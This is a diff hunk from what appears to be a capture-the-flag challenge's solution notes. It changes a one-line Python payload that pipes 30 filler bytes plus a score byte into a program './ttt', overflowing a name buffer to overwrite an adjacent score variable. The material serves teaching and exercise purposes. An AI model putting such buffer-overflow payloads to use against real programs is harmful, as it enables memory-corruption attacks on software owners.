@@ -4,7 +4,7 @@ Solution: load name up with enough chars to overwrite score. Note that to make
 this problem actually hard, I suggest only giving them the compiled file and
 not the source code.
 
-python -c "print 'A'*30 + '\x15'" | ./ttt
+python -c "print 'A'*30 + '\x0f'" | ./ttt
                  |-----|  |----|
              name buffer  score of 15
 
